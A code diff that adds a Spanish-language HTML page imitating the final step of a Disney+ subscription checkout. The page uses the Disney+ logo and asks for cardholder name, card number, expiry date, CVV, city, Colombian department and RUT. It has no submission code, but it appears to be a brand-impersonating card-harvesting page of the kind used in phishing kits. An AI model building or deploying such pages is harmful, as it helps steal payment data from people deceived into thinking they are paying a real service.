@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Paso 3 de 3 | ¡A disfrutar!</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background: #0d0d0f;
+    color: #fff;
+}
+
+/* HEADER */
+.header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 22px;
+}
+
+.header img {
+    width: 110px;
+}
+
+.header a {
+    color: #ffffff;
+    font-size: 15px;
+    text-decoration: none;
+}
+
+/* CONTENIDO */
+.container {
+    padding: 20px;
+    max-width: 650px;
+    margin: auto;
+}
+
+.step {
+    color: #bbbbbb;
+    font-size: 15px;
+}
+
+h1 {
+    font-size: 32px;
+    margin-top: 5px;
+    margin-bottom: 25px;
+}
+
+/* TABS */
+.tabs {
+    display: flex;
+    justify-content: flex-start;
+    gap: 30px;
+    margin-bottom: 25px;
+}
+
+.tab {
+    font-size: 17px;
+    padding-bottom: 8px;
+    cursor: pointer;
+    opacity: 0.7;
+}
+
+.tab.active {
+    border-bottom: 2px solid #00b3ff;
+    opacity: 1;
+}
+
+/* LABEL */
+label {
+    font-size: 13px;
+    color: #cccccc;
+    display: block;
+    margin-bottom: 6px;
+}
+
+/* INPUTS */
+input, select {
+    width: 100%;
+    padding: 15px;
+    background: #1a1a1a;
+    border: 1px solid #383838;
+    border-radius: 6px;
+    color: #fff;
+    margin-bottom: 18px;
+    font-size: 15px;
+}
+
+/* FILA MM/AA Y CVV */
+.row {
+    display: flex;
+    gap: 15px;
+}
+
+.row div {
+    width: 100%;
+}
+
+/* ICONOS TARJETAS */
+.cards {
+    position: absolute;
+    top: 44px;
+    right: 10px;
+}
+
+.cards img {
+    width: 42px;
+    margin-left: 8px;
+}
+
+/* INPUT CON ICONO */
+.input-icon {
+    position: relative;
+}
+
+.input-icon i {
+    position: absolute;
+    right: 12px;
+    top: 44px;
+    font-size: 18px;
+    opacity: 0.6;
+    cursor: pointer;
+}
+
+/* BOTÓN FINAL */
+button {
+    width: 100%;
+    padding: 18px;
+    background: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 17px;
+    font-weight: 600;
+    color: #000;
+    cursor: pointer;
+    margin-top: 10px;
+}
+
+button:hover {
+    background: #dddddd;
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
+    <a href="#">Cerrar sesión</a>
+</div>
+
+<!-- CONTENIDO PRINCIPAL -->
+<div class="container">
+
+    <div class="step">PASO 3 DE 3</div>
+    <h1>¡A disfrutar!</h1>
+
+    <!-- TABS -->
+    <div class="tabs">
+        <div class="tab active">💳 Crédito/Débito</div>
+        <div class="tab">🏦 Mercado Pago</div>
+    </div>
+
+    <!-- FORMULARIO -->
+
+    <label>NOMBRE EN LA TARJETA</label>
+    <input type="text" placeholder="Nombre completo">
+
+    <label>NÚMERO DE LA TARJETA</label>
+    <div class="input-icon">
+        <input type="text" placeholder="•••• •••• •••• ••••">
+        <div class="cards">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
+        </div>
+    </div>
+
+    <div class="row">
+        <div>
+            <label>FECHA DE VENCIMIENTO</label>
+            <input type="text" placeholder="MM/AA">
+        </div>
+
+        <div>
+            <label>CÓDIGO DE SEGURIDAD</label>
+            <div class="input-icon">
+                <input type="text" placeholder="CVV">
+                <i>🛈</i>
+            </div>
+        </div>
+    </div>
+
+    <label>CIUDAD</label>
+    <input type="text" placeholder="Ciudad">
+
+    <label>DEPARTAMENTO</label>
+    <select>
+        <option>Seleccionar...</option>
+        <option>Antioquia</option>
+        <option>Valle del Cauca</option>
+        <option>Atlántico</option>
+        <option>Bolívar</option>
+        <option>Cundinamarca</option>
+    </select>
+
+    <label>RUT (OPCIONAL)</label>
+    <input type="text" placeholder="Número de RUT">
+
+    <button>Confirmar y suscribirme</button>
+
+</div>
+
+</body>
+</html>
